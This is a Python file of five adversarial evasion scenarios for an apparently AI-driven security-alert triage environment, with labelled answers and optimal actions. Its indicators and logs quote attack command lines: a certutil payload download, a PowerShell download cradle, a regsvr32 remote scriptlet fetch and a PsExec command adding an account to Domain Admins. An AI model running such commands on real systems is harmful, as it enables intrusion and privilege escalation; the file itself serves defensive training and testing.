"""Adversarial evasion scenario templates for SecOps Alert Router V2.

These are the hardest scenarios — surface indicators look benign and the agent
must correlate multiple subtle clues to classify correctly.
"""

EVASION_SCENARIOS: list[dict] = [
    # evasion-001 — Benign: security tool triggering heuristic false positive
    {
        "id": "evasion-001",
        "category": "evasion",
        "difficulty": "hard",
        "is_true_threat": False,
        "severity": "high",
        "mitre": {"tactic": "Defense Evasion", "technique": "T1218", "name": "System Binary Proxy Execution"},
        "alert": {
            "rule": "EDR-EVASION-LOLBIN-004",
            "description": "Rundll32.exe loading non-standard DLL with command-line pattern matching known proxy-execution technique.",
        },
        "source": {"ip": "10.10.25.80", "domain": "ws-it-admin-04.corp.local", "email": "", "geo": "Internal — Building C, Floor 3"},
        "target": {"host": "ws-it-admin-04.corp.local", "ip": "10.10.25.80", "user": "jmartinez", "email": "j.martinez@corp.local", "department": "Infrastructure", "role": "Senior Systems Administrator", "criticality": "critical"},
        "indicators": {
            "process": "rundll32.exe",
            "command_line": "rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\ITOps\\deploy-agent.inf,DefaultInstall",
            "parent_process": "cmd.exe -> powershell.exe -> SCCM-Agent.exe",
            "dll_loaded": "advpack.dll (Microsoft signed, catalog verified)",
            "inf_file": "deploy-agent.inf (IT Ops deployment manifest)",
            "file_hash": "sha256:a1b2c3...e4f5 (not in any malware DB)",
            "network_activity": "None observed",
            "user_context": "jmartinez (Domain Admin, IT Operations)",
        },
        "raw_log": (
            "2026-04-14T09:42:18Z ws-it-admin-04 Sysmon[EventID=1]: Process Create: rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\ITOps\\deploy-agent.inf,DefaultInstall User=CORP\\jmartinez ParentImage=SCCM-Agent.exe IntegrityLevel=High\n"
            "2026-04-14T09:42:18Z ws-it-admin-04 Sysmon[EventID=7]: ImageLoaded: C:\\Windows\\System32\\advpack.dll Signed=true Issuer=Microsoft SignatureStatus=Valid\n"
            "2026-04-14T09:42:19Z ws-it-admin-04 Sysmon[EventID=11]: FileCreate: C:\\ProgramData\\ITOps\\deploy-agent.inf CreationTime=2026-04-12T14:30:00Z"
        ),
        "investigate": {
            "analyze_headers": "Process tree: SCCM-Agent.exe (Microsoft SCCM, signed) -> powershell.exe (constrained language mode) -> cmd.exe -> rundll32.exe. Standard SCCM task-sequence pattern for software deployment. The advpack.dll call is a documented Microsoft method for processing INF files during package install.",
            "query_siem": "2026-04-14T08:00Z SCCM maintenance window opened for IT-Admin collection. 09:40Z Deployment 'Monitoring Agent v3.2 Rollout' began (42 hosts). 09:42Z rundll32.exe alert fired on ws-it-admin-04. Same alert fired on 8 other IT workstations in the same 2-minute window — all from SCCM task sequence.",
            "check_reputation": "advpack.dll: Microsoft-signed system DLL since Windows XP. deploy-agent.inf: created 2 days ago by SCCM package build pipeline, SHA-256 matches SCCM repository artifact. SCCM-Agent.exe: Microsoft signed, version matches fleet baseline. No tampering indicators.",
            "check_asset": "ws-it-admin-04 assigned to J. Martinez (Senior SysAdmin, 12-yr tenure). Domain-joined, CrowdStrike EDR healthy, SCCM client reporting normally. Last full scan 2026-04-13 (clean). Patch level current. No prior security incidents.",
            "analyze_payload": "deploy-agent.inf: standard INF referencing monitoring-agent-v3.2.msi from SCCM DP. Performs MSI silent install, service registration, config copy. All referenced files signed by internal PKI CA. No obfuscation, no encoded payloads, no external callbacks.",
            "correlate_alerts": "8 identical EDR alerts across IT-Admin workstation collection, all within SCCM maintenance window. Change ticket CHG-9102 documents rollout approved by IT Ops manager K. Patel on 2026-04-12. No anomalous network traffic, no lateral movement, no unexpected persistence.",
        },
        "optimal_actions": ["investigate_alert", "verify_change_management", "confirm_sccm_deployment", "close_false_positive", "tune_detection_rule"],
        "impact_if_missed": "Quarantining the SCCM deployment blocks a fleet-wide monitoring agent rollout (42 workstations). Escalation wastes 2-4 hours of IR team time and erodes trust in EDR alert fidelity.",
    },
    # evasion-002 — True threat: living-off-the-land (LOLBins) via certutil
    {
        "id": "evasion-002",
        "category": "evasion",
        "difficulty": "hard",
        "is_true_threat": True,
        "severity": "critical",
        "mitre": {"tactic": "Defense Evasion", "technique": "T1218", "name": "System Binary Proxy Execution"},
        "alert": {
            "rule": "EDR-EVASION-LOLBIN-001",
            "description": "Certutil.exe used with URL-download and base64 decode in rapid sequence on a finance workstation.",
        },
        "source": {"ip": "10.10.42.15", "domain": "ws-fin-analyst-07.corp.local", "email": "", "geo": "Internal — Building A, Floor 7"},
        "target": {"host": "ws-fin-analyst-07.corp.local", "ip": "10.10.42.15", "user": "lchen", "email": "l.chen@corp.local", "department": "Infrastructure", "role": "Financial Analyst Workstation", "criticality": "critical"},
        "indicators": {
            "process": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f https://update-service.azurewebsites.net/patch.b64 C:\\Users\\lchen\\AppData\\Local\\Temp\\patch.b64 && certutil.exe -decode patch.b64 patch.exe",
            "parent_process": "cmd.exe -> explorer.exe",
            "file_written": "C:\\Users\\lchen\\AppData\\Local\\Temp\\patch.exe",
            "download_url": "https://update-service.azurewebsites.net/patch.b64",
            "network_connection": "40.112.72.199:443 (Azure IP)",
            "subsequent_process": "patch.exe -> whoami.exe, nltest.exe",
        },
        "raw_log": (
            "2026-04-14T10:18:44Z ws-fin-analyst-07 Sysmon[EventID=1]: Process Create: certutil.exe -urlcache -split -f https://update-service.azurewebsites.net/patch.b64 C:\\Users\\lchen\\AppData\\Local\\Temp\\patch.b64 User=CORP\\lchen ParentImage=cmd.exe IntegrityLevel=Medium\n"
            "2026-04-14T10:18:47Z ws-fin-analyst-07 Sysmon[EventID=3]: NetworkConnect: certutil.exe -> 40.112.72.199:443 DestHostname=update-service.azurewebsites.net\n"
            "2026-04-14T10:18:52Z ws-fin-analyst-07 Sysmon[EventID=1]: Process Create: certutil.exe -decode patch.b64 patch.exe User=CORP\\lchen\n"
            "2026-04-14T10:19:01Z ws-fin-analyst-07 Sysmon[EventID=1]: Process Create: patch.exe User=CORP\\lchen\n"
            "2026-04-14T10:19:02Z ws-fin-analyst-07 Sysmon[EventID=1]: Process Create: whoami.exe /all ParentImage=patch.exe"
        ),
        "investigate": {
            "analyze_headers": "Process tree: explorer.exe -> cmd.exe -> certutil.exe. cmd.exe spawned via COM object invocation from explorer (unusual). Certutil -urlcache -split -f is a well-documented LOLBin download technique. The decoded patch.exe is unsigned, 847KB.",
            "query_siem": "2026-04-14T10:12Z lchen received email from it-helpdesk@corp-updates.com (external, not internal IT). Subject: 'Mandatory Security Patch — Install Before EOD'. 10:15Z Opened attachment instructions.pdf (clean PDF with social-engineering instructions). 10:18Z certutil download+decode. 10:19Z patch.exe recon (whoami, nltest). 10:20Z nltest /dclist:corp.local.",
            "check_reputation": "update-service.azurewebsites.net: registered 3 days ago, free-tier Azure app, no threat feed data yet. Domain mimics legitimate update services. WHOIS privacy-protected. SSL cert Let's Encrypt 3 days old. patch.b64 VT score: 0/72 (too new).",
            "check_asset": "ws-fin-analyst-07 belongs to L. Chen (Financial Analyst, SAP ERP access). No change tickets or approved patching today. IT helpdesk confirms they did NOT send manual patch instructions. lchen has no admin privileges. EDR healthy but patch.exe not blocked (unknown hash).",
            "analyze_payload": "patch.b64 is base64-encoded PE. Decoded patch.exe (SHA-256: d4e5f6...a7b8) is 847KB unsigned. Static analysis: imports CreateRemoteThread, VirtualAllocEx, WriteProcessMemory (injection APIs). Strings reference Cobalt Strike beacon config. Performs whoami /all, nltest /dclist, then HTTPS callback to 185.220.101.44:8443 (Tor exit).",
            "correlate_alerts": "Phishing from it-helpdesk@corp-updates.com also sent to 11 other finance users. ws-fin-analyst-03 and ws-fin-analyst-11 show certutil attempts blocked by AppLocker. This host lacked updated AppLocker policy (GPO lag). No prior alerts on host.",
        },
        "optimal_actions": ["investigate_alert", "isolate_endpoint", "kill_malicious_process", "block_c2_domain", "block_c2_ip", "reset_user_credentials", "scan_other_targeted_hosts", "escalate_to_incident_response"],
        "impact_if_missed": "Cobalt Strike beacon on finance workstation with SAP ERP access. Attacker gains domain recon for lateral movement. 11 other finance users targeted — delayed response risks wider compromise and data exfiltration.",
    },
    # evasion-003 — True threat: fileless malware via PowerShell
    {
        "id": "evasion-003",
        "category": "evasion",
        "difficulty": "hard",
        "is_true_threat": True,
        "severity": "critical",
        "mitre": {"tactic": "Execution", "technique": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"},
        "alert": {
            "rule": "EDR-EVASION-FILELESS-002",
            "description": "PowerShell with encoded command spawned from Microsoft Office application.",
        },
        "source": {"ip": "10.10.35.60", "domain": "ws-hr-mgr-02.corp.local", "email": "", "geo": "Internal — Building B, Floor 5"},
        "target": {"host": "ws-hr-mgr-02.corp.local", "ip": "10.10.35.60", "user": "amorrison", "email": "a.morrison@corp.local", "department": "Infrastructure", "role": "HR Manager Workstation", "criticality": "critical"},
        "indicators": {
            "process": "powershell.exe",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO...",
            "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets.s3.amazonaws.com/jquery.min.js')",
            "parent_process": "WINWORD.EXE (Resume_2026.docm)",
            "network_connection": "52.216.109.44:443 (AWS S3)",
            "registry_modified": "HKCU\\...\\CurrentVersion\\Run -> 'WindowsUpdate' = powershell.exe -enc ...",
            "memory_indicators": "Reflective DLL injection detected in svchost.exe",
        },
        "raw_log": (
            "2026-04-14T13:47:22Z ws-hr-mgr-02 Sysmon[EventID=1]: Process Create: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO... User=CORP\\amorrison ParentImage=WINWORD.EXE\n"
            "2026-04-14T13:47:24Z ws-hr-mgr-02 Sysmon[EventID=3]: NetworkConnect: powershell.exe -> 52.216.109.44:443 DestHostname=cdn-assets.s3.amazonaws.com\n"
            "2026-04-14T13:47:26Z ws-hr-mgr-02 Sysmon[EventID=13]: RegistryValueSet: HKCU\\...\\Run\\WindowsUpdate = \"powershell.exe -enc ...\"\n"
            "2026-04-14T13:47:28Z ws-hr-mgr-02 Sysmon[EventID=8]: CreateRemoteThread: powershell.exe -> svchost.exe TargetPID=4812"
        ),
        "investigate": {
            "analyze_headers": "WINWORD.EXE -> powershell.exe. Resume_2026.docm contains VBA macro. Flags -nop -w hidden -enc are the classic fileless execution triad. Decoded base64 is an IEX download cradle from S3. svchost.exe (PID 4812) is non-standard — parent is powershell.exe, not services.exe.",
            "query_siem": "2026-04-14T13:30Z amorrison received email from recruitment@talent-hub.io with Resume_2026.docm. 13:45Z Document opened in Word. 13:47Z Macro -> PowerShell -> S3 download -> registry persistence -> svchost injection. 13:48Z Injected svchost begins DNS queries to mail.corp-sharepoint-sync.com (DGA-like pattern).",
            "check_reputation": "cdn-assets.s3.amazonaws.com: legitimate S3 name but 'jquery.min.js' is 312KB (real jQuery is 87KB). Bucket created 5 days ago, public-read ACL. mail.corp-sharepoint-sync.com: registered 7 days ago via Namecheap, privacy-protected, resolves to 91.215.85.22 (Moldova, frequent C2 host). talent-hub.io: 14-day-old domain, no legitimate presence.",
            "check_asset": "ws-hr-mgr-02 belongs to A. Morrison (HR Manager, access to employee PII, salary data). Office macros set to 'Disable with notification' — user clicked Enable. EDR in monitor-only mode (HR macro policy exception). Last clean scan 2 days ago.",
            "analyze_payload": "Stage 1: VBA macro Shell() launches encoded PowerShell. Stage 2: 'jquery.min.js' is a PS script performing reflective DLL injection of Meterpreter reverse-HTTPS into svchost.exe. Stage 3: C2 to mail.corp-sharepoint-sync.com:443 via domain fronting. Registry run key for persistence. Entirely fileless after initial macro.",
            "correlate_alerts": "talent-hub.io sent 6 .docm emails to HR this week. ws-hr-coord-01 opened similar attachment yesterday but macros blocked by updated GPO. DNS logs: mail.corp-sharepoint-sync.com queried only from ws-hr-mgr-02. EDR: svchost.exe PID 4812 performing LDAP enumeration against DCs.",
        },
        "optimal_actions": ["investigate_alert", "isolate_endpoint", "kill_injected_process", "remove_persistence", "block_c2_domains", "quarantine_macro_document", "reset_user_credentials", "scan_hr_department_hosts", "escalate_to_incident_response"],
        "impact_if_missed": "Meterpreter in memory with active C2. Attacker can exfiltrate employee PII and credentials. LDAP enumeration signals lateral movement. HR breach triggers regulatory notification. 5 other HR users received similar lures.",
    },
    # evasion-004 — True threat: renamed legitimate tool (PsExec -> svchost)
    {
        "id": "evasion-004",
        "category": "evasion",
        "difficulty": "expert",
        "is_true_threat": True,
        "severity": "critical",
        "mitre": {"tactic": "Defense Evasion", "technique": "T1036", "name": "Masquerading"},
        "alert": {
            "rule": "EDR-EVASION-MASQUERADE-001",
            "description": "Process hash mismatch — svchost.exe hash matches PsExec.exe, executing from non-standard path.",
        },
        "source": {"ip": "10.10.50.200", "domain": "srv-devops-build-02.corp.local", "email": "", "geo": "Internal — Data Center Rack D-14"},
        "target": {"host": "srv-devops-build-02.corp.local", "ip": "10.10.50.200", "user": "svc-deploy", "email": "", "department": "Infrastructure", "role": "DevOps Build Server", "criticality": "critical"},
        "indicators": {
            "process": "svchost.exe (MASQUERADED — actual PsExec v2.43)",
            "command_line": "C:\\ProgramData\\Microsoft\\Crypto\\svchost.exe -accepteula -s -d \\\\dc-primary-01 cmd.exe /c \"net group 'Domain Admins' svc-deploy /add /domain\"",
            "file_path": "C:\\ProgramData\\Microsoft\\Crypto\\svchost.exe",
            "file_hash": "sha256:3b4a... (matches PsExec.exe v2.43 Sysinternals)",
            "original_filename": "PsExec.exe (PE header OriginalFilename)",
            "parent_process": "cmd.exe -> wmiprvse.exe",
            "target_remote_host": "dc-primary-01.corp.local (10.10.1.10)",
            "network_connection": "10.10.50.200 -> 10.10.1.10:445 (SMB)",
        },
        "raw_log": (
            "2026-04-14T02:14:33Z srv-devops-build-02 Sysmon[EventID=1]: Process Create: C:\\ProgramData\\Microsoft\\Crypto\\svchost.exe -accepteula -s -d \\\\dc-primary-01 cmd.exe /c \"net group 'Domain Admins' svc-deploy /add /domain\" User=CORP\\svc-deploy ParentImage=wmiprvse.exe Hashes=SHA256=3b4a... OriginalFileName=PsExec.exe\n"
            "2026-04-14T02:14:34Z srv-devops-build-02 Sysmon[EventID=3]: NetworkConnect: svchost.exe -> 10.10.1.10:445 (dc-primary-01)\n"
            "2026-04-14T02:14:35Z dc-primary-01 Security[EventID=4728]: Member added to Domain Admins: svc-deploy SubjectUser=svc-deploy\n"
            "2026-04-14T02:14:36Z dc-primary-01 Sysmon[EventID=1]: Process Create: PSEXESVC.exe User=NT AUTHORITY\\SYSTEM"
        ),
        "investigate": {
            "analyze_headers": "Binary at C:\\ProgramData\\Microsoft\\Crypto\\svchost.exe has PE header OriginalFilename=PsExec.exe, FileDescription='Execute processes remotely', CompanyName='Sysinternals'. Renamed to svchost.exe to evade name-based detection. Path is writable and looks system-related but is not C:\\Windows\\System32\\. Parent wmiprvse.exe indicates WMI remote launch.",
            "query_siem": "2026-04-14T01:45Z Failed RDP to srv-devops-build-02 from 10.10.48.15 (ws-dev-intern-03) user=svc-deploy (3x). 01:52Z Successful RDP. 02:05Z certutil.exe download from pastebin-raw.azurewebsites.net/dl/sv.exe. 02:10Z Renamed sv.exe -> svchost.exe. 02:14Z WMI lateral execution to dc-primary-01. 02:14Z svc-deploy added to Domain Admins.",
            "check_reputation": "File hash matches legitimate PsExec.exe v2.43 — not malware itself but a dual-use tool heavily abused by threat actors. Download source pastebin-raw.azurewebsites.net is attacker-controlled Azure free-tier app. Tool deliberately renamed to bypass name-based EDR rules.",
            "check_asset": "srv-devops-build-02 is a CI/CD build server. svc-deploy has local admin on build servers but should NOT have interactive logon or Domain Admin rights. RDP source ws-dev-intern-03 belongs to a developer intern who left 2 weeks ago — account not disabled. No change tickets for PsExec.",
            "analyze_payload": "PsExec targets dc-primary-01 with -s (SYSTEM) -d (non-interactive). Payload: net group 'Domain Admins' svc-deploy /add /domain — privilege escalation adding compromised service account to DA. PSEXESVC.exe installed on DC as SYSTEM confirms successful remote execution. Textbook AD privilege escalation.",
            "correlate_alerts": "Kill chain: (1) Dormant intern account brute-forced RDP into build server. (2) certutil LOLBin downloaded PsExec. (3) Renamed to svchost.exe. (4) WMI lateral execution to DC. (5) svc-deploy added to Domain Admins. Event 4728 confirms group modification. Active domain compromise in progress.",
        },
        "optimal_actions": ["investigate_alert", "isolate_build_server", "isolate_intern_workstation", "remove_from_domain_admins", "disable_compromised_accounts", "block_lateral_movement_paths", "audit_domain_admin_group", "full_dc_forensic_analysis", "escalate_to_incident_response", "activate_ir_plan"],
        "impact_if_missed": "Attacker has Domain Admin via primary DC. Full AD compromise imminent — golden tickets, NTDS.dit exfil, domain-wide ransomware, or undetectable persistence. Critical severity requiring immediate containment.",
    },
    # evasion-005 — True threat: slow-and-low APT
    {
        "id": "evasion-005",
        "category": "evasion",
        "difficulty": "expert",
        "is_true_threat": True,
        "severity": "critical",
        "mitre": {"tactic": "Defense Evasion", "technique": "T1027", "name": "Obfuscated Files or Information"},
        "alert": {
            "rule": "EDR-EVASION-SLOWLOW-001",
            "description": "Low-frequency anomalous DNS queries and scheduled-task persistence on executive assistant workstation over 12-day window.",
        },
        "source": {"ip": "10.10.10.88", "domain": "ws-exec-asst-01.corp.local", "email": "", "geo": "Internal — Executive Floor, Building A"},
        "target": {"host": "ws-exec-asst-01.corp.local", "ip": "10.10.10.88", "user": "rthompson", "email": "r.thompson@corp.local", "department": "Infrastructure", "role": "Executive Assistant to CFO", "criticality": "critical"},
        "indicators": {
            "dns_queries": "2-3 queries/hour to *.status-check.cloud (TXT records, avg 230 bytes, business hours only)",
            "scheduled_task": "\\Microsoft\\Windows\\Maintenance\\SilentCleanup — modified to run regsvr32.exe /s /i:https://status-check.cloud/sync scrobj.dll",
            "process": "regsvr32.exe (COM scriptlet proxy execution)",
            "network_pattern": "HTTPS beacon every 28-35 min with +-3min jitter to status-check.cloud",
            "data_volume": "4-12 KB per session (steganographic PNG images)",
            "total_exfil_estimate": "~380KB over 12 days",
            "files_accessed": "CFO calendar, board-meeting-notes-Q1.docx, M&A-Project-Falcon-summary.pptx",
        },
        "raw_log": (
            "2026-04-14T09:02:17Z ws-exec-asst-01 Sysmon[EventID=22]: DNSQuery: a1b2c3.status-check.cloud Type=TXT ProcessImage=svchost.exe\n"
            "2026-04-14T09:02:17Z ws-exec-asst-01 Sysmon[EventID=3]: NetworkConnect: regsvr32.exe -> 193.42.60.18:443 DestHostname=status-check.cloud\n"
            "2026-04-14T09:02:19Z ws-exec-asst-01 Sysmon[EventID=15]: FileCreateStreamHash: C:\\Users\\rthompson\\AppData\\Local\\Temp\\sync_0414.png:Zone.Identifier\n"
            "2026-04-14T09:30:44Z ws-exec-asst-01 Sysmon[EventID=22]: DNSQuery: d4e5f6.status-check.cloud Type=TXT"
        ),
        "investigate": {
            "analyze_headers": "Hijacked SilentCleanup scheduled task runs regsvr32.exe with COM scriptlet URL (T1218.010). Known LOLBin bypassing application whitelisting. HTTPS connections jittered at 28-35 min intervals — designed to stay below SIEM thresholds (most rules trigger on >10 connections/hour).",
            "query_siem": "12-day retrospective: 2026-04-02T08:15Z rthompson opened attachment from contact@executive-briefing.com (spear-phish), regsvr32.exe first seen. Apr 02-14: consistent 2-3 DNS TXT queries/hour during business hours only (09:00-17:30), zero weekends — evaded 24h volume threshold of 100 queries/domain. Apr 08 14:22Z M&A-Project-Falcon accessed. Apr 10 10:15Z Board meeting notes accessed.",
            "check_reputation": "status-check.cloud: registered 30 days ago via Njalla (privacy registrar favored by APTs). Hosted on 193.42.60.18 (Alexhost SRL, Moldova). Not in public threat feeds — purpose-built for this campaign. Let's Encrypt cert 28 days old. DNS TXT responses contain base64 data decoding to encrypted C2 commands.",
            "check_asset": "ws-exec-asst-01: R. Thompson, EA to CFO. Access to CFO email delegation, executive SharePoint, board docs, M&A Project Falcon (confidential $2.1B acquisition). Scheduled task modification not flagged because SilentCleanup is built-in Windows. No admin privs needed for user-context task modification.",
            "analyze_payload": "C2 via DNS TXT queries carrying encoded tasking; responses AES-256-encrypted. Exfiltration uses steganographic PNG images via HTTPS to status-check.cloud/sync. Files accessed: board minutes, M&A summary, CFO calendar. Total exfil ~380KB in small increments below DLP byte-threshold alerts.",
            "correlate_alerts": "No prior alerts — first detection after 12 days. EDR anomaly engine flagged DNS pattern after accumulating baseline data. executive-briefing.com also used against 2 other Fortune 500 companies (FS-ISAC TLP:RED). TTPs match APT29 (Cozy Bear): slow-and-low, business-hours beaconing, steganographic exfil, M&A targeting.",
        },
        "optimal_actions": ["investigate_alert", "isolate_endpoint", "remove_scheduled_task_persistence", "block_c2_domain_and_ip", "forensic_memory_capture", "audit_accessed_documents", "reset_user_credentials", "notify_executive_leadership", "engage_threat_intelligence", "activate_ir_plan", "assess_regulatory_notification"],
        "impact_if_missed": "APT with 12-day foothold has exfiltrated M&A intelligence worth billions. Continued access monitors CFO communications and board decisions. Leaked Project Falcon details enable insider trading or deal sabotage. APT29 attribution suggests nation-state economic espionage. SEC regulatory exposure for material non-public information.",
    },
]
